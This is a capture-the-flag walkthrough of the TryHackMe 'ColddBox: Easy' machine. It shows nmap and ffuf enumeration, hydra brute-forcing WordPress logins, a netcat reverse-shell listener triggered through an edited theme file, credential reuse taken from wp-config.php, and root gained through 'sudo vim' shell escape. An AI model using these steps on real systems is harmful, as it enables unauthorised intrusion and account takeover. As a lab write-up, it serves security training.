## ColddBox: Easy
https://tryhackme.com/room/colddboxeasy

## Enum
```
nmap -Pn -sS -sC -sV 10.10.57.152

Host is up (0.52s latency).
Not shown: 999 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)

nmap -Pn -sS 10.10.57.152 -p- --min-rate=5000

Host is up (0.43s latency).
Not shown: 65408 closed tcp ports (reset), 125 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
4512/tcp open  unknown

```

```
nmap -Pn -sC -sV -sS 10.10.57.152 -p 80,4512 -A

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.16 (94%), Linux 3.10 - 3.13 (94%), Linux 5.4 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.2 - 4.9 (91%), Linux 2.6.22 (91%), Crestron XPanel control system (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
ffuf -u http://ip.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
________________________________________________

.htaccess               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 2651ms]
.htpasswd               [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 3652ms]
.hta                    [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 4652ms]
hidden                  [Status: 301, Size: 301, Words: 20, Lines: 10, Duration: 400ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 423ms]
server-status           [Status: 403, Size: 271, Words: 20, Lines: 10, Duration: 408ms]
wp-admin                [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 398ms]
wp-content              [Status: 301, Size: 305, Words: 20, Lines: 10, Duration: 416ms]
wp-includes             [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 412ms]
xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1, Duration: 444ms]
:: Progress: [4713/4713] :: Job [1/1] :: 97 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
```

```
curl ip.thm/hidden/

<!DOCTYPE html>
<html>
<head>
<meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
<title>Hidden Place</title>
</head>
<body>
<div align="center">
<h1>U-R-G-E-N-T</h1>
<h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2>
</div>
</body>
</html>
```
🏴 C0ldd, Hugo, Philip, is anyone valid user?

![image](https://user-images.githubusercontent.com/6504854/192141877-5d6c6710-f01f-4345-84a1-0930b597fa0e.png)

🏴 As cheking error msg , all three users are sure to be able to login.

```
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt ip.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect" -v                                                                         Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking http-post-form://ip.thm:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 488.00 tries/min, 488 tries in 00:01h, 43032709 to do in 1469:42h, 16 active
[VERBOSE] Page redirected to http://ip.thm/wp-admin/
[80][http-post-form] host: ip.thm   login: C0ldd   password: 9***************
```
![image](https://user-images.githubusercontent.com/6504854/192142265-f77f7882-3b94-42a6-b500-f709cb8b658e.png)

```
nc -lnvp 4444

curl http://ip.thm/wp-content/themes/twentyfifteen/404.php
```

## Flag
```
nc -lnvp 4444
listening on [any] 4444 ...
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 13:13:36 up  3:19,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ ls /home
c0ldd
$ ls /home/c0ldd
user.txt
$ cat /home/c0ldd/user.txt
cat: /home/c0ldd/user.txt: Permission denied
$ su c0ldd
su: must be run from a terminal
$ python3 -c 'import pty; pty.spawn("/bin/bash")';
www-data@ColddBox-Easy:/$ su c0ldd
su c0ldd
Password: 9****************

su: Authentication failure

cat /etc/shadow
cat: /etc/shadow: Permission denied
www-data@ColddBox-Easy:/$ find / -user c0ldd 2>/dev/null
find / -user c0ldd 2>/dev/null
/home/c0ldd
/home/c0ldd/.bash_history
/home/c0ldd/.cache
/home/c0ldd/.cache/motd.legal-displayed
/home/c0ldd/user.txt
/home/c0ldd/.bashrc
/home/c0ldd/.bash_logout
/home/c0ldd/.sudo_as_admin_successful
/home/c0ldd/.profile
www-data@ColddBox-Easy:/$ ls -la /home/c0ldd/.bash_history
ls -la /home/c0ldd/.bash_history
-rw------- 1 c0ldd c0ldd 0 Oct 19  2020 /home/c0ldd/.bash_history
www-data@ColddBox-Easy:/$ cd var/www
cd var/www
www-data@ColddBox-Easy:/var/www$ ls -la
ls -la
total 12
drwxr-xr-x  3 root root 4096 Oct 14  2020 .
drwxr-xr-x 14 root root 4096 Sep 24  2020 ..
drwxr-xr-x  6 root root 4096 Oct 14  2020 html
www-data@ColddBox-Easy:/var/www$ cd html
cd html
www-data@ColddBox-Easy:/var/www/html$ ls
ls
hidden           wp-blog-header.php    wp-includes        wp-signup.php
index.php        wp-comments-post.php  wp-links-opml.php  wp-trackback.php
license.txt      wp-config-sample.php  wp-load.php        xmlrpc.php
readme.html      wp-config.php         wp-login.php
wp-activate.php  wp-content            wp-mail.php
wp-admin         wp-cron.php           wp-settings.php
www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php

cat wp-config.php
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', '********');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'c************');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```
🏴 C0ldd may use same password for MYSQL DB....

```
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: c************

c0ldd@ColddBox-Easy:/var/www/html$ cat /home/c0ldd/user.txt
cat /home/c0ldd/user.txt
R************************************************

c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
sudo -l
[sudo] password for c0ldd: 

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

c0ldd@ColddBox-Easy:/var/www/html$ sudo vim -c ':!/bin/sh'
sudo vim -c ':!/bin/sh'

E558: No he encontrado la definición del terminal en "terminfo"
'unknown' desconocido. Los terminales incorporados disponibles son:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
Usando ' por defectoansi'

:!/bin/sh
# cat /root/root.txt
cat /root/root.txt
w*******************************************
```

![image](https://user-images.githubusercontent.com/6504854/192142702-42ea0243-d1b0-49ad-8390-cbed70173254.png)

![image](https://user-images.githubusercontent.com/6504854/192142714-e5ec6c9b-0bec-48b2-ad32-eea09d7c4b44.png)

![image](https://user-images.githubusercontent.com/6504854/192142753-173c62c0-ff04-457b-8a54-f7739edf41c6.png)

Muchas gracias! Adios! 😄

